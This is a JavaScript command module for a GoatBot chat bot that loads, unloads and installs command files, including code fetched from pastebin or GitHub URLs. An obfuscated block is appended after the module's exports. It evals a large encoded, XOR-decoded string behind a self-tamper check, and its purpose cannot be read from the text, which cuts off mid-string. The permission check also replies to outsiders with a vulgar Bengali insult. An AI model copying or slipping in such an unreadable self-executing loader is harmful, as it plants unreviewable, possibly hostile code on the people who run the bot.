const axios = require("axios");
const { execSync } = require("child_process");
const fs = require("fs-extra");
const path = require("path");
const cheerio = require("cheerio");
const { client } = global;

const { configCommands } = global.GoatBot;
const { log, loading, removeHomeDir } = global.utils;

function getDomain(url) {
	const regex = /^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:/\n]+)/im;
	const match = url.match(regex);
	return match ? match[1] : null;
}

function isURL(str) {
	try {
		new URL(str);
		return true;
	}
	catch (e) {
		return false;
	}
}

module.exports = {
	config: {
		name: "cmd",
		version: "1.16",
		author: "NTKhang",
		countDown: 5,
		role: 2,
		shortDescription: {
			vi: "Quản lý command",
			en: "Manage command"
		},
		longDescription: {
			vi: "Quản lý các tệp lệnh của bạn",
			en: "Manage your command files"
		},
		category: "owner",
		guide: {
			vi: "   {pn} load <tên file lệnh>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <tên file lệnh>: Tải xuống và cài đặt một tệp lệnh từ một url, url là đường dẫn đến tệp lệnh (raw)"
				+ "\n   {pn} install <tên file lệnh> <code>: Tải xuống và cài đặt một tệp lệnh từ một code, code là mã của lệnh",
			en: "   {pn} load <command file name>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <command file name>: Download and install a command file from a url, url is the path to the file (raw)"
				+ "\n   {pn} install <command file name> <code>: Download and install a command file from a code, code is the code of the command"
		}
	},

	langs: {
		vi: {
			missingFileName: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn reload",
			loaded: "✅ | Đã load command \"%1\" thành công",
			loadedError: "❌ | Load command \"%1\" thất bại với lỗi\n%2: %3",
			loadedSuccess: "✅ | Đã load thành công (%1) command",
			loadedFail: "❌ | Load thất bại (%1) command\n%2",
			openConsoleToSeeError: "👀 | Hãy mở console để xem chi tiết lỗi",
			missingCommandNameUnload: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn unload",
			unloaded: "✅ | Đã unload command \"%1\" thành công",
			unloadedError: "❌ | Unload command \"%1\" thất bại với lỗi\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Vui lòng nhập vào url hoặc code và tên file lệnh bạn muốn cài đặt",
			missingUrlOrCode: "⚠️ | Vui lòng nhập vào url hoặc code của tệp lệnh bạn muốn cài đặt",
			missingFileNameInstall: "⚠️ | Vui lòng nhập vào tên file để lưu lệnh (đuôi .js)",
			invalidUrl: "⚠️ | Vui lòng nhập vào url hợp lệ",
			invalidUrlOrCode: "⚠️ | Không thể lấy được mã lệnh",
			alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tục",
			installed: "✅ | Đã cài đặt command \"%1\" thành công, file lệnh được lưu tại %2",
			installedError: "❌ | Cài đặt command \"%1\" thất bại với lỗi\n%2: %3",
			missingFile: "⚠️ | Không tìm thấy tệp lệnh \"%1\"",
			invalidFileName: "⚠️ | Tên tệp lệnh không hợp lệ",
			unloadedFile: "✅ | Đã unload lệnh \"%1\""
		},
		en: {
			missingFileName: "⚠️ | Please enter the command name you want to reload",
			loaded: "✅ | Loaded command \"%1\" successfully",
			loadedError: "❌ | Failed to load command \"%1\" with error\n%2: %3",
			loadedSuccess: "✅ | Loaded successfully (%1) command",
			loadedFail: "❌ | Failed to load (%1) command\n%2",
			openConsoleToSeeError: "👀 | Open console to see error details",
			missingCommandNameUnload: "⚠️ | Please enter the command name you want to unload",
			unloaded: "✅ | Unloaded command \"%1\" successfully",
			unloadedError: "❌ | Failed to unload command \"%1\" with error\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Please enter the url or code and command file name you want to install",
			missingUrlOrCode: "⚠️ | Please enter the url or code of the command file you want to install",
			missingFileNameInstall: "⚠️ | Please enter the file name to save the command (with .js extension)",
			invalidUrl: "⚠️ | Please enter a valid url",
			invalidUrlOrCode: "⚠️ | Unable to get command code",
			alreadExist: "⚠️ | The command file already exists, are you sure you want to overwrite the old command file?\nReact to this message to continue",
			installed: "✅ | Installed command \"%1\" successfully, the command file is saved at %2",
			installedError: "❌ | Failed to install command \"%1\" with error\n%2: %3",
			missingFile: "⚠️ | Command file \"%1\" not found",
			invalidFileName: "⚠️ | Invalid command file name",
			unloadedFile: "✅ | Unloaded command \"%1\""
		}
	},

	onStart: async ({ args, message, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, event, commandName, getLang }) => {
	
	   const permission = global.GoatBot?.config?.DEV || [];
  if (!permission.includes(event.senderID)) {
    api.sendMessage("- মাদারচুদ বট কি তর বাপের নাকি..😾", event.threadID, event.messageID);
    return;
  }

		const { unloadScripts, loadScripts } = global.utils;
		if (
			args[0] == "load"
			&& args.length == 2
		) {
			if (!args[1])
				return message.reply(getLang("missingFileName"));
			const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
			if (infoLoad.status == "success")
				message.reply(getLang("loaded", infoLoad.name));
			else {
				message.reply(
					getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message)
					+ "\n" + infoLoad.error.stack
				);
				console.log(infoLoad.errorWithThoutRemoveHomeDir);
			}
		}
		else if (
			(args[0] || "").toLowerCase() == "loadall"
			|| (args[0] == "load" && args.length > 2)
		) {
			const fileNeedToLoad = args[0].toLowerCase() == "loadall" ?
				fs.readdirSync(__dirname)
					.filter(file =>
						file.endsWith(".js") &&
						!file.match(/(eg)\.js$/g) &&
						(process.env.NODE_ENV == "development" ? true : !file.match(/(dev)\.js$/g)) &&
						!configCommands.commandUnload?.includes(file)
					)
					.map(item => item = item.split(".")[0]) :
				args.slice(1);
			const arraySucces = [];
			const arrayFail = [];

			for (const fileName of fileNeedToLoad) {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
				if (infoLoad.status == "success")
					arraySucces.push(fileName);
				else
					arrayFail.push(` ❗ ${fileName} => ${infoLoad.error.name}: ${infoLoad.error.message}`);
			}

			let msg = "";
			if (arraySucces.length > 0)
				msg += getLang("loadedSuccess", arraySucces.length);
			if (arrayFail.length > 0) {
				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, arrayFail.join("\n"));
				msg += "\n" + getLang("openConsoleToSeeError");
			}

			message.reply(msg);
		}
		else if (args[0] == "unload") {
			if (!args[1])
				return message.reply(getLang("missingCommandNameUnload"));
			const infoUnload = unloadScripts("cmds", args[1], configCommands, getLang);
			infoUnload.status == "success" ?
				message.reply(getLang("unloaded", infoUnload.name)) :
				message.reply(getLang("unloadedError", infoUnload.name, infoUnload.error.name, infoUnload.error.message));
		}
		else if (args[0] == "install") {
			let url = args[1];
			let fileName = args[2];
			let rawCode;

			if (!url || !fileName)
				return message.reply(getLang("missingUrlCodeOrFileName"));

			if (
				url.endsWith(".js")
				&& !isURL(url)
			) {
				const tmp = fileName;
				fileName = url;
				url = tmp;
			}

			if (url.match(/(https?:\/\/(?:www\.|(?!www)))/)) {
				global.utils.log.dev("install", "url", url);
				if (!fileName || !fileName.endsWith(".js"))
					return message.reply(getLang("missingFileNameInstall"));

				const domain = getDomain(url);
				if (!domain)
					return message.reply(getLang("invalidUrl"));

				if (domain == "pastebin.com") {
					const regex = /https:\/\/pastebin\.com\/(?!raw\/)(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://pastebin.com/raw/$1");
					if (url.endsWith("/"))
						url = url.slice(0, -1);
				}
				else if (domain == "github.com") {
					const regex = /https:\/\/github\.com\/(.*)\/blob\/(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://raw.githubusercontent.com/$1/$2");
				}

				rawCode = (await axios.get(url)).data;

				if (domain == "savetext.net") {
					const $ = cheerio.load(rawCode);
					rawCode = $("#content").text();
				}
			}
			else {
				global.utils.log.dev("install", "code", args.slice(1).join(" "));
				if (args[args.length - 1].endsWith(".js")) {
					fileName = args[args.length - 1];
					rawCode = event.body.slice(event.body.indexOf('install') + 7, event.body.indexOf(fileName) - 1);
				}
				else if (args[1].endsWith(".js")) {
					fileName = args[1];
					rawCode = event.body.slice(event.body.indexOf(fileName) + fileName.length + 1);
				}
				else
					return message.reply(getLang("missingFileNameInstall"));
			}

			if (!rawCode)
				return message.reply(getLang("invalidUrlOrCode"));

			if (fs.existsSync(path.join(__dirname, fileName)))
				return message.reply(getLang("alreadExist"), (err, info) => {
					global.GoatBot.onReaction.set(info.messageID, {
						commandName,
						messageID: info.messageID,
						type: "install",
						author: event.senderID,
						data: {
							fileName,
							rawCode
						}
					});
				});
			else {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
				infoLoad.status == "success" ?
					message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
					message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
			}
		}
		else
			message.SyntaxError();
	},

	onReaction: async function ({ Reaction, message, event, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang }) {
		const { loadScripts } = global.utils;
		const { author, data: { fileName, rawCode } } = Reaction;
		if (event.userID != author)
			return;
		const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
		infoLoad.status == "success" ?
			message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
			message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
	}
};



let QLLP;!function(){const wj5z=Array.prototype.slice.call(arguments);return eval("(function EN3o(n3ah){const Hq3g=XMUh(n3ah,fVxh(EN3o.toString()));try{let jY5g=eval(Hq3g);return jY5g.apply(null,wj5z);}catch(j0Ch){var LxFh=(0o206534-68918);while(LxFh<(0o400151%65569))switch(LxFh){case (0x3007D%0o200035):LxFh=j0Ch instanceof SyntaxError?(0O264353757%8):(0o600204%65567);break;case (0O264353757%8):LxFh=(0o203030-0x105F1);{console.log(\'Error: the code has been tampered!\');return}break;}throw j0Ch;}function fVxh(HsAh){let bQsh=1050092420;var Dnvh=(0o203542-67399);{let XKnh;while(Dnvh<(262196%0o200005)){switch(Dnvh){case (0o1000076%0x1000B):Dnvh=(0o201154-66125);{bQsh^=(HsAh.charCodeAt(XKnh)*(15658734^0O73567354)+HsAh.charCodeAt(XKnh>>>(0O73567354%6)))^882708700;}break;case (0o202330-66745):Dnvh=(0x4003C%0o200013);XKnh++;break;case (0x4004C%0o200017):Dnvh=XKnh<HsAh.length?(0o203124-67138):(0o1000134%65551);break;case (0o400123%0x1001C):Dnvh=(0o1000104%0x1000D);XKnh=(0x21786%3);break;}}}let ziqh=\"\";var zkXh=(0x9D8DE4-0O47306735);{let bSZh;while(zkXh<(0o205144-0x10A3E)){switch(zkXh){case (0x9D8DE4-0O47306735):zkXh=(65976-0o200642);bSZh=(0x21786%3);break;case (0o203004-0x105EE):zkXh=bSZh<(0O3153050563-0x19AC516B)?(262267%0o200032):(131152%0o200025);break;case (0o200574-0x10169):zkXh=(0x108AC-0o204207);{const vfSh=bQsh%(0x20043%0o200027);bQsh=Math.floor(bQsh/(68056-0o204703));ziqh+=vfSh>=(0o204444-0x1090A)?String.fromCharCode((0x111C6-0o210605)+(vfSh-(0o600150%65562))):String.fromCharCode((0o1000415%0x1002B)+vfSh);}break;case (0o205620-0x10B6B):zkXh=(0o203004-67054);bSZh++;break;}}}return ziqh;}function XMUh(raNh,THPh){raNh=decodeURI(raNh);let n5Hh=(0x75bcd15-0O726746425);let PCKh=\"\";var r2Ef=(66886-0o202453);{let TzHf;while(r2Ef<(68416-0o205440)){switch(r2Ef){case (0o600060%0x1000A):r2Ef=(0o200466-65815);{PCKh+=String.fromCharCode(raNh.charCodeAt(TzHf)^THPh.charCodeAt(n5Hh));n5Hh++;var nXzf=(0o201060-66068);while(nXzf<(0o201104-66087))switch(nXzf){case (0x10348-0o201454):nXzf=n5Hh>=THPh.length?(73639709%9):(0o201104-66087);break;case (73639709%9):nXzf=(0o203314-67247);{n5Hh=(0x21786%3);}break;}}break;case (0o1000060%65544):r2Ef=TzHf<raNh.length?(0o204160-0x1085E):(0o1000124%65549);break;case (69046-0o206633):r2Ef=(67296-0o203320);TzHf=(0x21786%3);break;case (0o1000333%0x1002F):r2Ef=(0o400050%0x1000C);TzHf++;break;}}}return PCKh;}})(\"@%12%16%0D%05%01%0B%0E%06%5CJ%18%00%00%0C%02%1C%1D%0C%0DF%E2%B4%A7%E2%B4%B7%E2%B4%B0%E2%B4%A2%5CJ%18%14%10%16%14%1A%1ACKM.9J3/H8;(I:C/%3E%3E;%5E9%3C5/H8;(9J3)%3E%3EO%5E9%3C%15%12%16%0D%05%01%0B%0E%06T%E2%B4%A1%E2%B4%A3%E2%B4%B3%E2%B4%BFJH%13%06%06%17%13%07%0CA@_BH=(I@C/%3EJL%5DI:3_88MT9%3CCUH8;(I:C/%3E%3E;%5E9%3C5/H8;(9J3)%3E%3EO%5EJJI_8%3EMTI:5%5D%1E2*92%5C%13%09X%05%13%1B%01%15%01%1B%0DC%E2%B5%94%E2%B4%BE%E2%B4%B1%E2%B4%AA@%5D%18%11%03%01%17%13%06T%E2%B4%B1%E2%B4%B6%E2%B4%B7%E2%B5%8FJH3%E2%B4%B6%E2%B4%A3%E2%B5%96%E2%B5%9A%5DK%3C3%E2%B4%A6%E2%B5%96%E2%B4%B4%E2%B4%A7%5DK%3C@%5DX%1E%00%00%0C%02%1C%1D%0C%0DF%E2%B4%A7%E2%B5%97%E2%B4%B6%E2%B4%A3%5CJ%18%14%10%16%14%1A%1AC%17%0E%1C%11:@%E2%B4%B6%E2%B5%93%E2%B4%B3%E2%B5%9F%5DKHC%5C%E2%B5%91%E2%B4%A8%E2%B4%B5%E2%B4%B2JHA)X%1E%00%00%0C%02%1C%1D%0C%0DF%E2%B4%A7%E2%B4%A7%E2%B4%AD%E2%B4%A3%5CJ%18%14%10%16%14%1A%1ACKN%5DIJ3_8%3E;.I:5)JLN%5EJ:C/8BM.?JI_8%3E;%5E9J3)%3E%3E;%5E9%3CA/H8=%5E9:C/%3E%3EM.I:5)%3EH=(?:C/%3E%3E=%5ECJ3)%3E%3E;%5CKJ3)J8MTI:5)%1E2*92O%01IK-%07;C%5CU:%02-ON%04%14%06%17%17%0A%09%1BB%E2%B4%A3%E2%B5%98%E2%B4%A4%E2%B4%A8KO%0E%10%04%1C%01%11%0DF%5D%E2%B5%90%E2%B4%BA%E2%B4%A0%E2%B4%B5KJO.%E2%B4%B0%E2%B4%A4%E2%B5%94%E2%B4%B8KJ;%5D%E2%B4%A0%E2%B4%A1%E2%B5%9D%E2%B4%B8KJO%08%04%14%06%17%17%0A%09%1BB%E2%B4%A3%E2%B4%A8%E2%B4%B1%E2%B4%A8KO%0E%10%04%1C%01%11%0DF%E2%B5%87%E2%B5%99%E2%B5%9F%E2%B4%AD%5CJH%E2%B4%A4%E2%B4%B5%E2%B4%B7%E2%B4%A9@%5DH%E2%B4%A1%E2%B5%96%E2%B5%85%E2%B4%A3IA_%E2%B4%A1%E2%B4%A3%E2%B4%B3%E2%B4%BDJHC%E2%B5%86%E2%B5%98%E2%B4%BD%E2%B4%A5%5DKJ%E2%B4%AA%E2%B4%A4%E2%B4%B9%E2%B4%A6N%5CI%E2%B4%A3%E2%B4%A8%E2%B4%A1%E2%B4%ABKO%08%04%14%06%17%17%0A%09%1BB%E2%B5%93%E2%B4%B3%E2%B4%BC%E2%B4%A8KO%0E%10%04%1C%01%11%0DFR%3E%14XDVVA%08%04%14%06%17%17%0A%09%1BB%E2%B5%93%E2%B5%93%E2%B5%8A%E2%B4%A8KO%0E%10%04%1C%01%11%0DF%5D%16%18%18%11%0C%05F%5D9%3CC/%3EJO.I@C/%3EHG%5E9%3C5%09%15%02%14U%E2%B4%B0%E2%B4%B4%E2%B4%A9%E2%B4%BF%5E8NE%0DUXDVQQPTT%5EDZJJ%5DR%0EZEPVTGOQ%10ERU%5E7KM@D%0CQUATWZYS%1BWFZ%25.%5DOKV%1AVQX@VRCCWT_GJ%3E%5D%13%17%0F%0B%00%0A%0C%08U%E2%B4%A0%E2%B5%91%E2%B4%A8%E2%B4%B8KJ%1D%07%07%15%1D%06%0DC%E2%B5%94%E2%B5%8E%E2%B4%AC%E2%B5%9B@%5DH%E2%B4%A1%E2%B5%96%E2%B4%A5%E2%B4%A5IA_%E2%B4%A1%E2%B4%A3%E2%B4%B3%E2%B5%8DJHC%E2%B4%B6%E2%B4%A3%E2%B4%B6%E2%B4%AE%5DK%1C%0E%01%0D%00%12%1C%0D%0FH%E2%B5%86%E2%B4%A8%E2%B4%A0%E2%B4%AA%5DK%1A%1A%11%17%16%14%1BB%E2%B4%B3%E2%B5%9D%E2%B4%A3%E2%B4%A4KO%5E%E2%B5%90%E2%B5%9A%E2%B4%B6%E2%B4%B3KJM%E2%B5%87%E2%B5%99%E2%B4%BF%E2%B4%AB%5CJH%E2%B5%94%E2%B5%8E%E2%B4%BC%E2%B4%A2@%5DH%E2%B5%91%E2%B5%9D%E2%B5%8B%E2%B4%A9IA%09%05%16%08%16%16%08%07%1AC%E2%B5%91%E2%B4%BD%E2%B5%8D%E2%B4%AEIA%0F%11%06%12%00%10%0FH%E2%B4%A6%E2%B4%B6%E2%B4%B2%E2%B5%9E%5DKJ%E2%B4%AA%E2%B4%A4%E2%B4%B9%E2%B4%A6N%5CI%E2%B4%A3%E2%B4%B8%E2%B4%AE%E2%B4%A6KO%5E%E2%B4%A0%E2%B4%B1%E2%B4%A2%E2%B5%8EKJ%1B%13%17%0F%0B%00%0A%0C%08U%E2%B4%B0%E2%B4%A4%E2%B5%94%E2%B4%B8KJ%1D%07%07%15%1D%06%0DC%E2%B4%B4%E2%B4%A0%E2%B4%B3%E2%B4%A9@%5DH%E2%B5%91%E2%B5%9D%E2%B4%AB%E2%B4%A1IA_%E2%B4%A1%E2%B5%93%E2%B5%96%E2%B5%8EJHC%E2%B4%A6%E2%B4%B6%E2%B4%B2%E2%B4%AE%5DKJ%E2%B5%9A%E2%B5%8F%E2%B5%9D%E2%B4%A8N%5CI%E2%B4%A3%E2%B5%98%E2%B4%A4%E2%B4%A4KO%5E%E2%B4%A0%E2%B4%A1%E2%B4%BD%E2%B4%BCKJM%E2%B4%B7%E2%B4%A2%E2%B4%B4%E2%B5%90%5CJ%1E%10%14%10A%E2%B4%BA%E2%B4%A1%E2%B5%92%E2%B4%AF%5B.JQ%10ESUWMOQ%07FSPVDQHD%5CS%1BTERU,QS%0CTERQ%5BBJOND%5BW%5EMPFV%1APQXDQUOYJQ%07FSRPFRLX%0CRSUMSHD%5CS%0CTERU%5CFNS%1EDRPXAJ%3E%5D%13%17%0F%0B%00%0A%0C%08U%E2%B4%A0%E2%B4%A1%E2%B5%9D%E2%B4%B8KJ%1D%07%07%15%1D%06%0DCN%5E9:C/8HG%5E9%3C5_8H=(?%3CC/%3E%3E=%5E9%3C5/H8;(?HC%5CK%E2%B5%91%E2%B4%AD%E2%B4%A6%E2%B5%95IA%5DIK%E2%B4%A4%E2%B4%B5%E2%B4%A7%E2%B4%A0@%5DJJ%1B%13%17%0F%0B%00%0A%0C%08U%E2%B4%A0%E2%B4%B1%E2%B4%B2%E2%B4%BFKJ%1D%07%07%15%1D%06%0DC%E2%B4%A4%E2%B4%B5%E2%B4%B7%E2%B4%A9@%5DH%E2%B5%91%E2%B5%9D%E2%B4%BB%E2%B5%98IA_%E2%B5%91%E2%B5%98%E2%B4%B8%E2%B4%B6JHC%E2%B5%86%E2%B5%98%E2%B4%BD%E2%B4%A1%5DKJ%E2%B5%9A%E2%B5%8F%E2%B4%BD%E2%B4%A8N%5C%1F%07%1D%1A%00%17%0F%1A%0CA%E2%B5%9A%E2%B5%8F%E2%B4%BD%E2%B4%A8N%5C%19%13%0D%00%16%11%08UJ:5/8%3E;%5E9%3CA/HBM.?JI_8%3EMTI:5)%1E2*92O%0F%0C,*%5B%13%17%0F%0B%00%0A%0C%08%5DK%1A%1A%11%17%16%14%1BBIX%1BQSTEUQED%1BRVAS%25A%09X%05%13%1B%01%15%01%1B%0DC%E2%B5%94%E2%B4%AE%E2%B5%9A%E2%B4%A9@%E2%B4%A6%E2%B4%A6%E2%B5%9F%E2%B4%AE%5C%19%13%0D%00%16%11%08U%E2%B4%B0%E2%B5%94%E2%B4%AF%E2%B5%8E8%E2%B4%B1%E2%B4%A3%E2%B5%89%E2%B4%AA%3CS%09%05%16%08%16%16%08%07%1AC%E2%B4%B1%E2%B4%B3%E2%B5%84%E2%B4%AAIA%0F%11%06%12%00%10%0FH%5CHBM.?J@_H8M.?%3C3_8%3E;%5CKJ@%E2%B4%A6%E2%B5%96%E2%B4%B4%E2%B5%99%5DKH%15%12%16%0D%05%01%0B%0E%06T%E2%B4%A1%E2%B4%A3%E2%B5%93%E2%B4%BDJH%13%06%06%17%13%07%0CA@%E2%B5%86%E2%B4%A8%E2%B5%90%E2%B4%A1%5DKHC/%3E%1E%00%00%0C%02%1C%1D%0C%0DF%E2%B4%B7%E2%B4%B2%E2%B4%BB%E2%B4%AF%5CJ%18%14%10%16%14%1A%1AC%E2%B4%A1%E2%B4%A6%E2%B4%A0%E2%B5%9AIA_%E2%B4%B1%E2%B4%B6%E2%B5%97%E2%B4%B7JHC%E2%B4%B6%E2%B4%A3%E2%B5%96%E2%B5%9E%5DKJ%E2%B4%AA%E2%B4%A4%E2%B4%A9%E2%B5%99N%5CI%E2%B4%A3%E2%B4%B8%E2%B4%AE%E2%B4%A2KO%5E%E2%B4%B0%E2%B5%94%E2%B4%BF%E2%B5%89KJM%E2%B4%A7%E2%B5%97%E2%B4%B6%E2%B5%95%5CJH%E2%B4%A4%E2%B4%A5%E2%B4%A8%E2%B5%9B@%5D%1E2*92O)!$*%5B%13%17%0F%0B%00%0A%0C%08%5DK%1A%1A%11%17%16%14%1BBIX%1BQSUCRQEBTWREK%1CS%12%16%0D%05%01%0B%0E%06T%E2%B5%91%E2%B5%98%E2%B4%B8%E2%B4%B2JH%13%06%06%17%13%07%0CA@U8%3EM.?H3_BH=(I@C/%3E%3E%1B%13%17%0F%0B%00%0A%0C%08U%E2%B5%90%E2%B4%AA%E2%B4%BB%E2%B4%B3KJ%1D%07%07%15%1D%06%0DC%E2%B4%A4%E2%B4%A5%E2%B4%B8%E2%B4%A0@%5DH%E2%B4%B1%E2%B5%93%E2%B4%A2%E2%B5%9FIA_%E2%B4%B1%E2%B5%96%E2%B4%B1%E2%B5%88JHC%E2%B4%B6%E2%B4%B3%E2%B4%A9%E2%B5%9C%5DK%1C%0E%01%0D%00%12%1C%0D%0FH%E2%B4%A6%E2%B5%96%E2%B4%B4%E2%B4%A1%5DK%1A%1A%11%17%16%14%1BBII/%3EH=(K:C/%3E%3E%1B$.-8Z%00%10,%3C_%07%1D%1A%00%17%0F%1A%0CIA%0F%11%06%12%00%10%0FH%5CS%0CWERQYEQFV%0DSQXD&J%1BN%04%14%06%17%17%0A%09%1BB%E2%B4%A3%E2%B4%A8%E2%B4%A1%E2%B4%ABKO%0E%10%04%1C%01%11%0DF%5D9%3C3/%3E%3EM.?H3_8%3EMTI:5)%1E%05%13%1B%01%15%01%1B%0DC%E2%B5%94%E2%B4%AE%E2%B4%BA%E2%B4%A9@%5D%18%11%03%01%17%13%06TKK%E2%B5%94%E2%B4%BE%E2%B4%B1%E2%B5%96@%5DJIN%E2%B4%A7%E2%B4%A7%E2%B4%BD%E2%B4%AA%5CJJO%5EJJ3/H8=%5E9%3C5_8H=(?%3CC/%3E%3E=%5E9%3C5/H8;(?H%15%12%16%0D%05%01%0B%0E%06T%E2%B5%91%E2%B5%98%E2%B4%A8%E2%B4%BDJH%13%06%06%17%13%07%0CA%E2%B5%9A%E2%B5%8F%E2%B4%BD%E2%B4%A0N%5CI%E2%B4%B3%E2%B4%BD%E2%B5%85%E2%B4%A1KO%5E%E2%B4%A0%E2%B5%91%E2%B4%A8%E2%B4%B2KJM%E2%B4%A7%E2%B4%A7%E2%B5%9D%E2%B5%94%5CJH%E2%B4%A4%E2%B4%A5%E2%B4%B8%E2%B4%A0@%5DH%E2%B5%91%E2%B5%9D%E2%B5%8B%E2%B4%A9IA_%E2%B5%91%E2%B4%A8%E2%B4%A5%E2%B5%8BJHC%E2%B4%A6%E2%B4%A6%E2%B5%9F%E2%B5%9A%5DK%1C%0E%01%0D%00%12%1C%0D%0FH%E2%B4%A6%E2%B4%B6%E2%B4%B2%E2%B4%AE%5DK%1A%1A%11%17%16%14%1BBIIU8%3EM.?H3_8%3E;%083-$$M%1467+%5C%0E%01%0D%00%12%1C%0D%0F@%5D%18%11%03%01%17%13%06TKS%09GRWZDSNPMUQ%5C%5D%1EX%00%00%0C%02%1C%1D%0C%0DF%E2%B4%A7%E2%B5%97%E2%B4%A6%E2%B4%A0%5CJ%18%14%10%16%14%1A%1AC%E2%B5%91%E2%B5%9D%E2%B4%BB%E2%B5%98IA_%E2%B4%A1%E2%B4%A3%E2%B5%93%E2%B4%BDJHC%E2%B4%B6%E2%B4%A3%E2%B4%B6%E2%B5%9A%5DKJ%E2%B4%BA%E2%B4%B1%E2%B5%9F%E2%B5%9FN%5CI%E2%B4%B3
